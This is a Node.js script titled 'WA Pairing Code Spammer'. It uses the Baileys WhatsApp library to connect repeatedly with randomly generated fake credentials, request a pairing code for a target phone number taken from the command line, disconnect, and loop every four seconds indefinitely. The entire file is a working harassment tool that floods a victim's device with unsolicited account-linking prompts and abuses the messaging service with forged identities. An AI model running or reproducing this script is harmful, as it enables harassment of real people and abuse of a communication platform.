const { default: makeWASocket, Browsers } = require("@whiskeysockets/baileys");
const pino = require("pino");

const TARGET = process.argv[2] || "628123456789";
let count = 0;

console.log("\n╔══════════════════════════════════╗");
console.log("║   WA Pairing Code Spammer        ║");
console.log("║   Target: " + TARGET + "          ║");
console.log("╚══════════════════════════════════╝\n");

function spam() {
  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    browser: Browsers.macOS("Desktop"),
    auth: {
      creds: {
        signedIdentityKey: { private: { type: "Buffer", data: require("crypto").randomBytes(32) }, public: { type: "Buffer", data: require("crypto").randomBytes(32) } },
        signedPreKey: { keyPair: { private: { type: "Buffer", data: require("crypto").randomBytes(32) }, public: { type: "Buffer", data: require("crypto").randomBytes(32) } }, signature: require("crypto").randomBytes(64), keyId: 1 },
        registrationId: 1,
        advSecretKey: require("crypto").randomBytes(32).toString("base64"),
        nextPreKeyId: 1,
        firstUnuploadedPreKeyId: 1,
        serverHasPreKeys: false,
        account: { details: { isNumber: true, countryCode: "62", phoneNumber: Math.random().toString().slice(2, 12) } }
      }, keys: {}
    }
  });

  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open") {
      try {
        const code = await sock.requestPairingCode(TARGET);
        count++;
        console.log(`[${new Date().toLocaleTimeString()}] #${count} ✓ Pairing code sent: ${code}`);
      } catch(e) {
        console.log(`[${new Date().toLocaleTimeString()}] #${count} ✗ ${e.message?.slice(0,50)}`);
      }
      sock.end(undefined);
      setTimeout(spam, 4000);
    }
  });
}

spam();
